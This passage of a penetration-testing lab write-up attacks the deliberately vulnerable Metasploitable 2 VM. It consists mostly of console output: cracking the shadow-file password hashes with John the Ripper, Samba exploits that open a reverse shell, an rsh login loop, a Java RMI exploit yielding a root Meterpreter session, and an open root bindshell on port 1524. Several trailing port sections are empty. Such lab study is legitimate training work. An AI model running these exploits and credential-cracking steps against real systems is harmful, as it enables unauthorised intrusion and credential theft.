Use the "--format=aix-smd5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
123456789        (klog)
batman           (sys)
service          (service)
user             (user)
4g 0:00:00:24 DONE (2018-08-08 22:35) 0.1622g/s 3577p/s 17206c/s 17206C/s ?tude..vagrant
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~# john unshadowed 
Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
Use the "--format=aix-smd5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
Remaining 3 password hashes with 3 different salts
Press 'q' or Ctrl-C to abort, almost any other key for status
postgres         (postgres)
msfadmin         (msfadmin)
root@kali:~#
root@kali:~# john -show unshadowed 
sys:batman:3:3:sys:/dev:/bin/sh
klog:123456789:103:104::/home/klog:/bin/false
msfadmin:msfadmin:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
postgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
user:user:1001:1001:just a user,111,,:/home/user:/bin/bash
service:service:1002:1002:,,,:/home/service:/bin/bash

6 password hashes cracked, 1 left
```

## Port 139 and 445
```
msf > use auxiliary/admin/smb/samba_symlink_traversal
msf auxiliary(admin/smb/samba_symlink_traversal) > show options

Module options (auxiliary/admin/smb/samba_symlink_traversal):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOST      10.10.10.101     yes       The target address
   RPORT      445              yes       The SMB service port (TCP)
   SMBSHARE                    yes       The name of a writeable share on the server
   SMBTARGET  rootfs           yes       The name of the directory that should point to the root filesystem

msf auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmp
SMBSHARE => tmp
msf auxiliary(admin/smb/samba_symlink_traversal) > run

[*] 10.10.10.101:445 - Connecting to the server...
[*] 10.10.10.101:445 - Trying to mount writeable share 'tmp'...
[*] 10.10.10.101:445 - Trying to link 'rootfs' to the root filesystem...
[*] 10.10.10.101:445 - Now access the following share to browse the root filesystem:
[*] 10.10.10.101:445 - 	\\10.10.10.101\tmp\rootfs\

[*] Auxiliary module execution completed
msf auxiliary(admin/smb/samba_symlink_traversal) >
```

We can now map the share and browse the root file system.
```
root@kali:~# smbclient -L 10.10.10.101
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            METASPLOITABLE
root@kali:~# smbclient //10.10.10.101/tmp
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 29 15:23:44 2018
  ..                                 DR        0  Mon May 21 04:36:12 2012
  4467.jsvc_up                        R        0  Fri Jul 27 21:38:21 2018
  .ICE-unix                          DH        0  Fri Jul 27 21:38:00 2018
  orbit-msfadmin                     DR        0  Sat Jul 28 20:25:32 2018
  .X11-unix                          DH        0  Fri Jul 27 21:38:07 2018
  .X0-lock                           HR       11  Fri Jul 27 21:38:07 2018
  rootfs                             DR        0  Mon May 21 04:36:12 2012
  gconfd-msfadmin                    DR        0  Sat Jul 28 20:25:32 2018

		7282168 blocks of size 1024. 5418792 blocks available
smb: \>
```

Since we have access to the root file system which has been mapped under the tmp share, we can attempt to obtain confidential data, such as the passwd and shadow file dumps to obtain credentials. Another possible, and perhaps a direct exploit may be using:

```
msf > use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  10.10.10.101     yes       The target address
   RPORT  139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP double handler on 10.10.10.100:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo VSMZEdzvYTQB0sEZ;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "VSMZEdzvYTQB0sEZ\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (10.10.10.100:4444 -> 10.10.10.101:53066) at 2018-08-05 16:27:35 +1000

whoami
root
hostname
metasploitable
```

## Port 512-514
```
for u in $(cat /root/msfusers.txt); do rsh -l $u 10.10.10.101; done
```

We keep getting the password prompt for each user we attempt to authenticate as. Apparently this is because we don’t have the rsh-client installed on kali, so I proceeded to install it using apt-get install rsh-client -y (See: http://www.kalitutorials.net/2014/05/metasploitable-2-vulnerability.html). When we try again we can get shell access for various users, including:

  * backup
  * bin
  * daemon
  * games
  * gnats
  * irc
  * libuuid
  * list
  * lp
  * mail
  * man
  * msfadmin
  * news
  * nobody
  * postgres
  * proxy
  * service
  * sys
  * user
  * uucp
  * www-data
  * root

## Port 1099
```
msf auxiliary(scanner/misc/java_rmi_server) > use exploit/multi/misc/java_rmi_server
msf exploit(multi/misc/java_rmi_server) > show options

Module options (exploit/multi/misc/java_rmi_server):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
   RHOST      10.10.10.101     yes       The target address
   RPORT      1099             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Generic (Java Payload)


msf exploit(multi/misc/java_rmi_server) > exploit

[*] Started reverse TCP handler on 10.10.10.100:4444 
[*] 10.10.10.101:1099 - Using URL: http://0.0.0.0:8080/CNnZ9xPLqN06
[*] 10.10.10.101:1099 - Local IP: http://10.0.2.15:8080/CNnZ9xPLqN06
[*] 10.10.10.101:1099 - Server started.
[*] 10.10.10.101:1099 - Sending RMI Header...
[*] 10.10.10.101:1099 - Sending RMI Call...
[*] 10.10.10.101:1099 - Replied to request for payload JAR
[*] Sending stage (53837 bytes) to 10.10.10.101
[*] Meterpreter session 1 opened (10.10.10.100:4444 -> 10.10.10.101:34162) at 2018-08-06 20:59:02 +1000

[-] 10.10.10.101:1099 - Exploit failed: RuntimeError Timeout HTTPDELAY expired and the HTTP Server didn't get a payload request
[*] 10.10.10.101:1099 - Server stopped.
[*] Exploit completed, but no session was created.
msf exploit(multi/misc/java_rmi_server) > 
msf exploit(multi/misc/java_rmi_server) > sessions

Active sessions
===============

  Id  Name  Type                    Information            Connection
  --  ----  ----                    -----------            ----------
  1         meterpreter java/linux  root @ metasploitable  10.10.10.100:4444 -> 10.10.10.101:34162 (10.10.10.101)

msf exploit(multi/misc/java_rmi_server) > sessions 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer    : metasploitable
OS          : Linux 2.6.24-16-server (i386)
Meterpreter : java/linux
meterpreter > shell
Process 1 created.
Channel 1 created.
whoami
root
hostname
metasploitable
^Z
Background channel 1? [y/N]  y
meterpreter > 
Background session 1? [y/N]  
msf exploit(multi/misc/java_rmi_server) >
```

## Port 1524
```
root@kali:~# telnet 10.10.10.101 1524
Trying 10.10.10.101...
Connected to 10.10.10.101.
Escape character is '^]'.
root@metasploitable:/# id
uid=0(root) gid=0(root) groups=0(root)
root@metasploitable:/# root@metasploitable:/# hostname
metasploitable
root@metasploitable:/# root@metasploitable:/#
```

## Port 2121
## Port 3306
## Port 3632
## Port 5432
## Port 5900
## Port 6000
## Port 6667
## Port 6697
## Port 8009
## Port 8180
## Port 8787
## Port 34009
## Port 35709
## Port 47474
## Port 51622

# References

  * https://www.offensive-security.com/metasploit-unleashed/ 
  * http://www.pentest-standard.org/index.php/Main_Page
